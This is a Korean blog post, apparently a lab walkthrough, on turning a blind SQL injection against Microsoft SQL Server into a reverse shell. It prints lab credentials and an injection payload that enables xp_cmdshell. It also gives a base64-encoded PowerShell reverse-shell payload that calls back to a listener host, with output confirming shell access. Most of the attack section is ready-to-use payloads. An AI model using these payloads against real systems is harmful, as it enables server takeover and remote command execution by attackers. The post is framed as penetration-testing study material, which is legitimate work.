---
layout: post
title: Blind sql 인젝션 공략
subtitle: Blind sql 인젝션일 때 리버스쉘 얻는 법
category: knowledge
thumbnail-img: /assets/img/knowledge/noreturn.png
tags: [reverseshell, sqli, blindsql, mssql]
author: Hong
---
SQL 인젝션을 사용하면 돌아오는 결과를 확인해가면서 데이터베이스의 데이터들을 알아갈 수 있다.

하지만 sql문법의 에러 메세지는 출력되지만 올바른 명령어를 입력했을 때 아무런 결과도 돌아오지 않는 경우가 있다.

이런 Blind sql의 경우에는 sqlmap을 사용하는데 sqlmap조차 제대로 파악하지 못 할 때가 있다.

이럴 땐 머릿속으로 데이터베이스의 상황을 상상해가면서 원하는 동작을 하도록 명령어를 입력해야 한다.
# SQL 인젝션 취약점 발견
다음과 같이 '을 유저네임에 입력했을 때 에러메세지가 출력되는 걸 보고 sql 인젝션에 취약하다는걸 알 수 있다.

또한 에러메세지로부터 mssql이 사용중이라는 유추할 수 있다.

![sqlinjection](/assets/img/knowledge/sqli.png)

이걸 이용해서 데이터베이스의 정보를 알아내려고 sql 명령어를 입력해본다.

![noreturn](/assets/img/knowledge/noreturn.png)

하지만 크레덴셜이 잘못됐다고만 나올 뿐 아무런 단서도 출력되지 않는다.

이런 경우 sqlmap같은 툴을 사용할 수 밖에 없지만 툴을 써도 실패했다.
# sql 명령어로 리버스쉘 열기
이럴 때 사용할 수 있는 취약점으로 데이터베이스를 쉘 모드로 변경해서 명령어를 실행시키는 방법이 있다.

```sql
kali@kali:~$impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL>EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL>RECONFIGURE;
SQL>EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL>RECONFIGURE;
```
실제로는 데이터베이스에 접속 후 위의 명령어를 순서대로 입력하면 쉘을 xp_cmdshell이라는 것을 사용할 수 있다.

머릿속으로 위의 명령어가 실행되는 이미지를 상상하면서 sql문을 입력해야 한다.

한줄에 다 입력하기 위해서 아래처럼 페이로드를 입력한다.
```sql
'; exec sp_configure 'show advanced options', 1; RECONFIGURE; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```
그럼 데이터베이스는 xp_cmdshell이 열리면서 명령어를 기다리는 상태가 된다.
# 리버스쉘 코드를 입력
다음으로는 단순히 리버스쉘 코드를 입력하면 된다.
```sql
1'; exec xp_cmdshell 'powershell /c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA1ADYANwA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="'; --
```
base64로 암호화된 페이로드를 보내면 리스닝 중인 포트에서 쉘이 리버스쉘이 열린다.
```powershell
PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
```